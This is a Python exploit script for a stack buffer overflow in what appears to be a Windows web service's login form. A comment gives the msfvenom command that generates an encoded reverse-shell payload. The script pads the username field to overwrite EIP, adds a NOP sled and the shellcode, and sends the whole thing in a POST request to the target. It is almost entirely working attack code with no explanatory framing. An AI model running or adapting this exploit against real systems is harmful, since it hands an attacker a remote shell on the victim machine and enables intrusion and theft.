#msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
#!/usr/bin/python
import socket



try:
	print "\nSending evil buffer..."

	shellcode = ("\xda\xde\xd9\x74\x24\xf4\x5a\xbe\xd7\x15\x9e\xa0\x29\xc9\xb1"
"\x52\x31\x72\x17\x83\xc2\x04\x03\xa5\x06\x7c\x55\xb5\xc1\x02"
"\x96\x45\x12\x63\x1e\xa0\x23\xa3\x44\xa1\x14\x13\x0e\xe7\x98"
"\xd8\x42\x13\x2a\xac\x4a\x14\x9b\x1b\xad\x1b\x1c\x37\x8d\x3a"
"\x9e\x4a\xc2\x9c\x9f\x84\x17\xdd\xd8\xf9\xda\x8f\xb1\x76\x48"
"\x3f\xb5\xc3\x51\xb4\x85\xc2\xd1\x29\x5d\xe4\xf0\xfc\xd5\xbf"
"\xd2\xff\x3a\xb4\x5a\xe7\x5f\xf1\x15\x9c\x94\x8d\xa7\x74\xe5"
"\x6e\x0b\xb9\xc9\x9c\x55\xfe\xee\x7e\x20\xf6\x0c\x02\x33\xcd"
"\x6f\xd8\xb6\xd5\xc8\xab\x61\x31\xe8\x78\xf7\xb2\xe6\x35\x73"
"\x9c\xea\xc8\x50\x97\x17\x40\x57\x77\x9e\x12\x7c\x53\xfa\xc1"
"\x1d\xc2\xa6\xa4\x22\x14\x09\x18\x87\x5f\xa4\x4d\xba\x02\xa1"
"\xa2\xf7\xbc\x31\xad\x80\xcf\x03\x72\x3b\x47\x28\xfb\xe5\x90"
"\x4f\xd6\x52\x0e\xae\xd9\xa2\x07\x75\x8d\xf2\x3f\x5c\xae\x98"
"\xbf\x61\x7b\x0e\xef\xcd\xd4\xef\x5f\xae\x84\x87\xb5\x21\xfa"
"\xb8\xb6\xeb\x93\x53\x4d\x7c\x5c\x0b\x3a\x03\x34\x4e\xc4\xfa"
"\x7f\xc7\x22\x96\x6f\x8e\xfd\x0f\x09\x8b\x75\xb1\xd6\x01\xf0"
"\xf1\x5d\xa6\x05\xbf\x95\xc3\x15\x28\x56\x9e\x47\xff\x69\x34"
"\xef\x63\xfb\xd3\xef\xea\xe0\x4b\xb8\xbb\xd7\x85\x2c\x56\x41"
"\x3c\x52\xab\x17\x07\xd6\x70\xe4\x86\xd7\xf5\x50\xad\xc7\xc3"
"\x59\xe9\xb3\x9b\x0f\xa7\x6d\x5a\xe6\x09\xc7\x34\x55\xc0\x8f"
"\xc1\x95\xd3\xc9\xcd\xf3\xa5\x35\x7f\xaa\xf3\x4a\xb0\x3a\xf4"
"\x33\xac\xda\xfb\xee\x74\xea\xb1\xb2\xdd\x63\x1c\x27\x5c\xee"
"\x9f\x92\xa3\x17\x1c\x16\x5c\xec\x3c\x53\x59\xa8\xfa\x88\x13"
"\xa1\x6e\xae\x80\xc2\xba")

	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	nop = "\x90" * 32
	inputBuffer = filler + eip + offset + nop + shellcode
	content = "username=" + inputBuffer + "&password=A"
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 1.1.1.1\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://1.1.1.1/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	buffer += content

	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("1.1.1.1", 80))
	s.send(buffer)
	s.close()

	print "\nDone!"


except:
	print "\nCould not connect!"
